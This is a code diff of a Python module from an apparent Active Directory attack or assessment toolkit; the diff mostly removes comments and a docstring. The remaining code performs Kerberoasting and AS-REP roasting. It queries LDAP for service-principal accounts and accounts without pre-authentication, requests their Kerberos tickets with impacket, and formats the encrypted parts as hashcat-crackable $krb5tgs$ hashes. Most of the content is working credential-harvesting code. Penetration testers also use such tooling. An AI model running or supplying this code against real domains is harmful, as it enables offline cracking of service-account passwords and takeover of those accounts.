@@ -1,10 +1,3 @@
-"""
-Module 6 — Kerberoasting & AS-REP Roasting
-  • Requests TGS tickets for all Kerberoastable SPNs
-  • Captures AS-REP hashes for accounts without pre-auth
-  • Outputs hashes in Hashcat-compatible format ($krb5tgs$ / $krb5asrep$)
-"""
-
 import os
 import datetime
 from rich.console import Console
@@ -74,18 +67,17 @@ def _do_kerberoast(domain: str, dc_ip: str, username: str, password: str,
                         sessionKey=session_key,
                     )
 
-                    # Extract encrypted part for hashcat
                     tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                     enc_part = tgs_rep["enc-part"]
                     etype = int(enc_part["etype"])
                     cipher_text = bytes(enc_part["cipher"])
 
-                    if etype == 23:  # RC4
+                    if etype == 23:
                         hash_str = (
                             f"$krb5tgs$23$*{sam}${domain_upper}${spn}*"
                             f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
                         )
-                    elif etype in (17, 18):  # AES
+                    elif etype in (17, 18):
                         hash_str = (
                             f"$krb5tgs${etype}$*{sam}${domain_upper}${spn}*"
                             f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
@@ -105,7 +97,6 @@ def _do_kerberoast(domain: str, dc_ip: str, username: str, password: str,
 
 def _do_asrep_roast(domain: str, dc_ip: str, accounts: list,
                     out_file: str = None) -> list:
-    """Request AS-REP for accounts with pre-auth disabled."""
     from impacket.krb5.kerberosv5 import sendReceive
     from impacket.krb5.asn1 import AS_REQ, AS_REP, KERB_PA_PAC_REQUEST
     from impacket.krb5.types import KerberosTime, Principal
@@ -121,7 +112,7 @@ def _do_asrep_roast(domain: str, dc_ip: str, accounts: list,
             client_name = Principal(sam, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
             as_req = AS_REQ()
             as_req["pvno"] = 5
-            as_req["msg-type"] = 10  # AS-REQ
+            as_req["msg-type"] = 10
 
             request_body = as_req["req-body"]
             request_body["kdc-options"] = constants.encodeFlags([])
@@ -159,9 +150,6 @@ def run(conn: ADConnection, output_dir: str = "."):
 
     result = {"kerberoastable": [], "asreproastable": [], "hashes": []}
 
-    # ------------------------------------------------------------------
-    # Collect Kerberoastable accounts (from LDAP)
-    # ------------------------------------------------------------------
     kerb_entries = conn.search(
         "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)"
         "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
@@ -185,9 +173,6 @@ def run(conn: ADConnection, output_dir: str = "."):
         ))
         result["kerberoastable"] = [{"account": s, "spns": sp} for s, sp in spn_users]
 
-    # ------------------------------------------------------------------
-    # AS-REP Roastable accounts
-    # ------------------------------------------------------------------
     asrep_entries = conn.search(
         "(&(objectCategory=person)(objectClass=user)"
         "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
@@ -205,9 +190,6 @@ def run(conn: ADConnection, output_dir: str = "."):
         ))
         result["asreproastable"] = asrep_accounts
 
-    # ------------------------------------------------------------------
-    # Attempt to request actual tickets if credentials available
-    # ------------------------------------------------------------------
     if conn.username and (conn.password or conn.ntlm_hash or conn.use_kerberos):
         try:
             dc_ip = socket.gethostbyname(conn.dc_host)
